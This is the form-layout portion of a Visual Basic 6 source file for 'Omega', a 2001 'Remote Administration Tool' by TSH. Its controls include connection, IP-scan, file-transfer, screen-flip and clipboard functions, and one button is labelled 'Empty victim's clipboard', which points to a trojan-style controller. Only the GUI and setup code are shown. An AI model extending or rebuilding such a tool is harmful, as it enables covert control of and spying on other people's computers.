         BackStyle       =   0  'Transparent
         Caption         =   "Text Color [Window Text]"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   3
         Left            =   900
         TabIndex        =   238
         Top             =   2520
         Width           =   1860
      End
      Begin VB.Shape ShapeColor_22 
         BackColor       =   &H0000FF00&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00E0E0E0&
         Height          =   360
         Index           =   3
         Left            =   360
         Top             =   2460
         Width           =   360
      End
      Begin VB.Label lbShape_22 
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   360
         Index           =   2
         Left            =   360
         TabIndex        =   236
         Top             =   1860
         Width           =   360
      End
      Begin VB.Label lbShape_22 
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   360
         Index           =   1
         Left            =   360
         TabIndex        =   235
         Top             =   1260
         Width           =   360
      End
      Begin VB.Label lbShape_22 
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   360
         Index           =   0
         Left            =   360
         TabIndex        =   234
         Top             =   720
         Width           =   360
      End
      Begin VB.Label Label69 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "3D Face Color [Taskbar, Buttons]"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   2
         Left            =   900
         TabIndex        =   231
         Top             =   1320
         Width           =   2400
      End
      Begin VB.Label Label69 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Window Color [Window Background]"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   1
         Left            =   900
         TabIndex        =   230
         Top             =   1920
         Width           =   2610
      End
      Begin VB.Label Label69 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Menu Color [Start Menu, Other Menu]"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   0
         Left            =   900
         TabIndex        =   229
         Top             =   810
         Width           =   2730
      End
      Begin VB.Shape ShapeColor_22 
         BackColor       =   &H00FF0000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00E0E0E0&
         Height          =   360
         Index           =   2
         Left            =   360
         Top             =   1860
         Width           =   360
      End
      Begin VB.Shape ShapeColor_22 
         BackColor       =   &H0000FFFF&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00E0E0E0&
         Height          =   360
         Index           =   1
         Left            =   360
         Top             =   1260
         Width           =   360
      End
      Begin VB.Shape ShapeColor_22 
         BackColor       =   &H000000FF&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00E0E0E0&
         Height          =   360
         Index           =   0
         Left            =   360
         Top             =   720
         Width           =   360
      End
      Begin VB.Label Label68 
         BackStyle       =   0  'Transparent
         Caption         =   "Win Colors                                                                 "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   228
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   21
      Left            =   4320
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   26
      Top             =   2250
      Width           =   4065
      Begin VB.CommandButton cmdChange_21 
         Caption         =   "Change"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   2100
         Style           =   1  'Graphical
         TabIndex        =   163
         ToolTipText     =   "Change resolution"
         Top             =   3570
         Width           =   1200
      End
      Begin VB.CommandButton cmdRefresh_21 
         Caption         =   "Refresh"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   810
         Style           =   1  'Graphical
         TabIndex        =   162
         ToolTipText     =   "Refresh available resolutions"
         Top             =   3570
         Width           =   1200
      End
      Begin VB.ListBox ListResolution_21 
         Height          =   2790
         ItemData        =   "frmMain.frx":4C3E
         Left            =   150
         List            =   "frmMain.frx":4C40
         TabIndex        =   161
         Top             =   600
         Width           =   3735
      End
      Begin VB.Label Label43 
         BackStyle       =   0  'Transparent
         Caption         =   "Available Resolutions:"
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   180
         TabIndex        =   164
         Top             =   330
         Width           =   3795
      End
      Begin VB.Label Label42 
         BackStyle       =   0  'Transparent
         Caption         =   "Resolution                                                                     "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   160
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   20
      Left            =   4200
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   25
      Top             =   2190
      Width           =   4065
      Begin VB.TextBox txtPrint_20 
         Height          =   2805
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   213
         Top             =   510
         Width           =   3795
      End
      Begin VB.CommandButton cmdPrint_20 
         Caption         =   "Print Text"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1410
         Style           =   1  'Graphical
         TabIndex        =   212
         ToolTipText     =   "Print text"
         Top             =   3540
         Width           =   1200
      End
      Begin VB.Label Label61 
         BackStyle       =   0  'Transparent
         Caption         =   "Print                                                                            "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   214
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   19
      Left            =   4080
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   24
      Top             =   2130
      Width           =   4065
      Begin VB.OptionButton OptFlip_19 
         BackColor       =   &H80000010&
         Caption         =   "Flip Screen Horizontally"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   1
         Left            =   810
         TabIndex        =   242
         Top             =   2880
         Width           =   2655
      End
      Begin VB.OptionButton OptFlip_19 
         BackColor       =   &H80000010&
         Caption         =   "Flip Screen Vertically"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   0
         Left            =   840
         TabIndex        =   241
         Top             =   1500
         Value           =   -1  'True
         Width           =   2085
      End
      Begin VB.CommandButton cmdFlipScr_19 
         Caption         =   "Flip Screen"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   1230
         Style           =   1  'Graphical
         TabIndex        =   240
         ToolTipText     =   "Flip screen"
         Top             =   3390
         Width           =   1500
      End
      Begin VB.Label Label70 
         BackStyle       =   0  'Transparent
         Caption         =   "Flip Screen                                                                "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   239
         Top             =   90
         Width           =   3800
      End
      Begin VB.Image Image2 
         Height          =   855
         Index           =   1
         Left            =   840
         Picture         =   "frmMain.frx":4C42
         Top             =   1950
         Width           =   2205
      End
      Begin VB.Image Image2 
         Height          =   855
         Index           =   0
         Left            =   840
         Picture         =   "frmMain.frx":50D7
         Top             =   570
         Width           =   2205
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   17
      Left            =   3840
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   22
      Top             =   2010
      Width           =   4065
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   16
      Left            =   3720
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   21
      Top             =   1950
      Width           =   4065
      Begin VB.CommandButton cmdEmpty_16 
         Caption         =   "Empty victim's clipboard"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   120
         Style           =   1  'Graphical
         TabIndex        =   131
         ToolTipText     =   "Empty victim's clipboard"
         Top             =   3600
         Width           =   3830
      End
      Begin VB.CommandButton cmdRead_16 
         Caption         =   "Read Clipboard Text"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   120
         Style           =   1  'Graphical
         TabIndex        =   130
         ToolTipText     =   "Read clipboard text"
         Top             =   3210
         Width           =   1880
      End
      Begin VB.CommandButton cmdSet_16 
         Caption         =   "Set Clipboard Text"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Left            =   2070
         Style           =   1  'Graphical
         TabIndex        =   129
         ToolTipText     =   "Set clipboard text"
         Top             =   3210
         Width           =   1880
      End
      Begin VB.TextBox txtClipboard_16 
         Height          =   2595
         Left            =   150
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   128
         Top             =   420
         Width           =   3735
      End
      Begin VB.Label Label34 
         BackStyle       =   0  'Transparent
         Caption         =   "Clipboard Text                                                         "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   127
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   13
      Left            =   3360
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   18
      Top             =   1770
      Width           =   4065
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   11
      Left            =   3120
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   16
      Top             =   1650
      Width           =   4065
   End
   Begin VB.PictureBox Picture4 
      Appearance      =   0  'Flat
      BackColor       =   &H80000004&
      ForeColor       =   &H80000008&
      Height          =   1785
      Left            =   60
      ScaleHeight     =   1755
      ScaleWidth      =   1545
      TabIndex        =   341
      Top             =   2850
      Width           =   1575
      Begin VB.Label lblfunction 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "Arial Narrow"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   225
         Index           =   0
         Left            =   720
         TabIndex        =   347
         Top             =   150
         Width           =   60
      End
      Begin VB.Label lblfunction 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "Arial Narrow"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   225
         Index           =   1
         Left            =   720
         TabIndex        =   346
         Top             =   405
         Width           =   60
      End
      Begin VB.Label lblfunction 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "Arial Narrow"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   225
         Index           =   2
         Left            =   720
         TabIndex        =   345
         Top             =   660
         Width           =   60
      End
      Begin VB.Label lblfunction 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "Arial Narrow"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   225
         Index           =   3
         Left            =   720
         TabIndex        =   344
         Top             =   900
         Width           =   60
      End
      Begin VB.Label lblfunction 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "Arial Narrow"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   225
         Index           =   4
         Left            =   720
         TabIndex        =   343
         Top             =   1155
         Width           =   60
      End
      Begin VB.Label lblfunction 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "Arial Narrow"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   225
         Index           =   5
         Left            =   720
         TabIndex        =   342
         Top             =   1410
         Width           =   60
      End
   End
   Begin VB.PictureBox Picture3 
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   1245
      ScaleHeight     =   255
      ScaleWidth      =   4515
      TabIndex        =   333
      Top             =   4780
      Width           =   4575
      Begin VB.Label lblAction 
         Appearance      =   0  'Flat
         BackColor       =   &H004B5367&
         BackStyle       =   0  'Transparent
         Caption         =   " Ready for action."
         BeginProperty Font 
            Name            =   "Arial Narrow"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   50
         TabIndex        =   334
         Top             =   0
         Width           =   4095
      End
   End
   Begin VB.PictureBox Picture2 
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   50
      ScaleHeight     =   255
      ScaleWidth      =   1125
      TabIndex        =   331
      Top             =   4780
      Width           =   1185
      Begin VB.Label lblStatus 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H004B5367&
         BackStyle       =   0  'Transparent
         Caption         =   "- Idle -"
         BeginProperty Font 
            Name            =   "Arial Narrow"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000E&
         Height          =   255
         Left            =   -270
         TabIndex        =   332
         Top             =   0
         Width           =   1650
      End
   End
   Begin VB.CommandButton cmdIP 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   5470
      Picture         =   "frmMain.frx":5543
      Style           =   1  'Graphical
      TabIndex        =   330
      ToolTipText     =   "IP Tool"
      Top             =   90
      Width           =   330
   End
   Begin MSWinsockLib.Winsock TCPClient 
      Left            =   2580
      Top             =   6630
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   3090
      Top             =   6600
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.ListBox List_15 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   1710
      TabIndex        =   154
      Top             =   6030
      Width           =   675
   End
   Begin VB.Timer IPTimer1 
      Enabled         =   0   'False
      Interval        =   200
      Left            =   1500
      Top             =   6630
   End
   Begin VB.TextBox txtAction 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   60
      TabIndex        =   77
      Top             =   5640
      Width           =   1515
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   30000
      Left            =   990
      Top             =   6630
   End
   Begin VB.ComboBox cbIP 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   450
      TabIndex        =   3
      ToolTipText     =   "IP address"
      Top             =   90
      Width           =   1815
   End
   Begin VB.TextBox txtPort 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   295
      Left            =   2880
      MaxLength       =   5
      TabIndex        =   2
      Text            =   "54896"
      ToolTipText     =   "Port number"
      Top             =   90
      Width           =   675
   End
   Begin VB.CommandButton cmdConnect 
      Caption         =   "Connect"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   3675
      Style           =   1  'Graphical
      TabIndex        =   1
      ToolTipText     =   "Connect"
      Top             =   90
      Width           =   1300
   End
   Begin MSForms.CommandButton cmdButton 
      Height          =   375
      Index           =   4
      Left            =   70
      TabIndex        =   340
      ToolTipText     =   "Extra Fun"
      Top             =   2310
      Width           =   1545
      ForeColor       =   0
      Caption         =   "Extra Fun      "
      PicturePosition =   327683
      Size            =   "2716;661"
      FontName        =   "Trebuchet MS"
      FontEffects     =   1073741825
      FontHeight      =   165
      FontCharSet     =   0
      FontPitchAndFamily=   2
      ParagraphAlign  =   3
      FontWeight      =   700
   End
   Begin MSForms.CommandButton cmdButton 
      Height          =   375
      Index           =   3
      Left            =   70
      TabIndex        =   339
      ToolTipText     =   "Fun Manager"
      Top             =   1890
      Width           =   1545
      ForeColor       =   0
      Caption         =   "Fun Manager "
      PicturePosition =   327683
      Size            =   "2716;661"
      FontName        =   "Trebuchet MS"
      FontEffects     =   1073741825
      FontHeight      =   165
      FontCharSet     =   0
      FontPitchAndFamily=   2
      ParagraphAlign  =   3
      FontWeight      =   700
   End
   Begin MSForms.CommandButton cmdButton 
      Height          =   375
      Index           =   2
      Left            =   70
      TabIndex        =   338
      ToolTipText     =   "Miscellaneous"
      Top             =   1470
      Width           =   1545
      ForeColor       =   0
      Caption         =   "Miscellaneous  "
      PicturePosition =   327683
      Size            =   "2716;661"
      FontName        =   "Arial Narrow"
      FontEffects     =   1073741825
      FontHeight      =   165
      FontCharSet     =   0
      FontPitchAndFamily=   2
      ParagraphAlign  =   3
      FontWeight      =   700
   End
   Begin MSForms.CommandButton cmdButton 
      Height          =   375
      Index           =   1
      Left            =   70
      TabIndex        =   337
      ToolTipText     =   "Advanced"
      Top             =   1050
      Width           =   1545
      ForeColor       =   0
      Caption         =   "Advanced     "
      PicturePosition =   327683
      Size            =   "2716;661"
      FontName        =   "Trebuchet MS"
      FontEffects     =   1073741825
      FontHeight      =   165
      FontCharSet     =   0
      FontPitchAndFamily=   2
      ParagraphAlign  =   3
      FontWeight      =   700
   End
   Begin MSForms.CommandButton cmdButton 
      Height          =   375
      Index           =   0
      Left            =   70
      TabIndex        =   336
      ToolTipText     =   "Connection"
      Top             =   630
      Width           =   1545
      ForeColor       =   0
      Caption         =   "Connection  "
      PicturePosition =   327683
      Size            =   "2716;661"
      FontName        =   "Trebuchet MS"
      FontEffects     =   1073741825
      FontHeight      =   165
      FontCharSet     =   0
      FontPitchAndFamily=   2
      ParagraphAlign  =   3
      FontWeight      =   700
   End
   Begin VB.Line Line8 
      BorderColor     =   &H00808080&
      X1              =   1680
      X2              =   1680
      Y1              =   525
      Y2              =   4705
   End
   Begin VB.Line Line5 
      BorderColor     =   &H00808080&
      X1              =   0
      X2              =   5910
      Y1              =   495
      Y2              =   495
   End
   Begin VB.Line Line7 
      BorderColor     =   &H00FFFFFF&
      X1              =   1680
      X2              =   -60
      Y1              =   2775
      Y2              =   2775
   End
   Begin VB.Line Line3 
      BorderColor     =   &H00FFFFFF&
      X1              =   1700
      X2              =   1700
      Y1              =   525
      Y2              =   4715
   End
   Begin VB.Line Line6 
      BorderColor     =   &H00808080&
      X1              =   0
      X2              =   5910
      Y1              =   4695
      Y2              =   4695
   End
   Begin VB.Label lblTemp 
      AutoSize        =   -1  'True
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   1710
      TabIndex        =   110
      Top             =   5670
      Visible         =   0   'False
      Width           =   45
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "IP:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Left            =   150
      TabIndex        =   5
      Top             =   150
      Width           =   1065
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Port:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   195
      Left            =   2400
      TabIndex        =   4
      Top             =   150
      Width           =   405
   End
   Begin VB.Line Line4 
      BorderColor     =   &H00808080&
      X1              =   1680
      X2              =   -60
      Y1              =   2760
      Y2              =   2760
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00FFFFFF&
      X1              =   0
      X2              =   5910
      Y1              =   4710
      Y2              =   4710
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00FFFFFF&
      X1              =   0
      X2              =   5910
      Y1              =   505
      Y2              =   505
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Copyright © 2001 By TSH
Option Explicit

Dim Check As Boolean  'check password
Dim Info(4096) As String 'StringTokenizer data
Dim MC As Byte, MF As Byte, MFno As Byte, Nofunc As Byte 'Interface control
Dim Button As Integer, icons As Integer 'this is MSG manager
Dim Profile As String 'load or save profile name
Dim ListNo As Integer, optNo As Integer 'list view item index 15 & opt_15 index
Dim WinListNo As Integer 'list view item index 14
Dim DefaultColor(3) As Long 'default WIN colors
Dim GetDir(25) As String 'Drive Type

Dim Scanned As Double 'IP scanned count
Dim DoneScan As Double 'IP scanned per second
Dim TotalscanIP As Double 'total IP scan

Dim bFileArriving As Boolean 'is file arriving
Dim FileLength As Long 'transfer file length
Dim Percent As Byte 'transfer file percent
Dim Total As Long 'transfer file arriving data
Dim DoneBytes As Long 'for calculating kbps
Dim sFile As String 'transfer file path
Dim sDir As String 'get directory path
Dim sArriving As String 'downloaded data of transfer file
Dim ReceiveData As Boolean 'has receive ACK
Dim UPCancel As Boolean 'is cancel upload file

Dim ReceiveFileList As String 'receiving data for filelist
Dim ReceiveFindFilesList As String 'receiving data for find files
Dim FindNo As String 'File found number, find files

Private Sub Form_Load()
Dim i As Integer
Dim s As String
    
    If App.PrevInstance = True Then
       Unload Me 'if program already running, close it.
       End
    End If
    
    frmSplash.lblProgress.Caption = "Loading local settings..."
    frmSplash.lblProgress.Refresh
    
    Call CheckPassPort 'get settings
    'get last connected IP address
    cbIP.text = GetSetting("Omega", "Connection", "IP Address")
    
    frmSplash.lblProgress.Caption = "Loading GUI settings..."
    frmSplash.lblProgress.Refresh
    
    MC = 9 'set nothing
    MF = 9 'set nothing
    lblStatus.Caption = "- Idle -"
    lblAction.Caption = " Ready for action."
    Call DisabledFunc 'disable function
    
    'for development, easy make position.
    frmMain.Height = 5505
    frmMain.Width = 5940
    For i = 0 To 30
        picfunc(i).Left = 1750
        picfunc(i).Top = 570
    Next i
    
    picfunc(30).ZOrder '30 is main page
    ListNo = -1 'set nothing
    optNo = -1 'set nothing
    
    For i = 0 To 4
        cmdButton(i).Picture = ImageList1.ListImages.Item(i + 2).Picture
    Next i
    
    frmSplash.lblProgress.Caption = "Loading main settings..."
    frmSplash.lblProgress.Refresh
    
    'main description
    Me.Caption = "Omega Version " & App.Major & "." & App.Minor & App.Revision & " By TSH"
    
    s = "Omega Version " & App.Major & "." & App.Minor & App.Revision
    s = s & vbCrLf & "Remote Administration Tool"
    s = s & vbCrLf & "Copyright " & Chr(169) & " 2001 By TSH"
    lblMain.Caption = s
    
    'get default WIN colors
    DefaultColor(0) = GetSysColor(COLOR_MENU)
    DefaultColor(1) = GetSysColor(COLOR_BTNFACE)
    DefaultColor(2) = GetSysColor(COLOR_BACKGROUND)
